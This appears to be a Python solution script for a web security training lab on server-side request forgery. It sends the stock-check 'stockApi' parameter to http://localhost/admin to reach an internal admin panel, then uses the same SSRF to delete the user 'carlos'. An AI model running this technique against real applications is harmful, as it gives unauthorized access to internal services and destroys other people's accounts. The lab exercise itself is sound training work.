import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# the stock check feature sends a stockApi parameter with a full URL
# the server fetches whatever URL we give it - no validation
# point it at localhost to access the admin panel that blocks external requests
lab.info("Accessing admin panel via SSRF...")
resp = lab.post("/product/stock", data={
    "stockApi": "http://localhost/admin"
})

# the response contains the admin page HTML with a delete link for carlos
# extract the delete URL and fire it through the same SSRF
if "carlos" in resp.text:
    lab.success("Got admin panel, deleting carlos...")
    lab.post("/product/stock", data={
        "stockApi": "http://localhost/admin/delete?username=carlos"
    })
else:
    lab.fail("Could not access admin panel")

lab.check_solved()
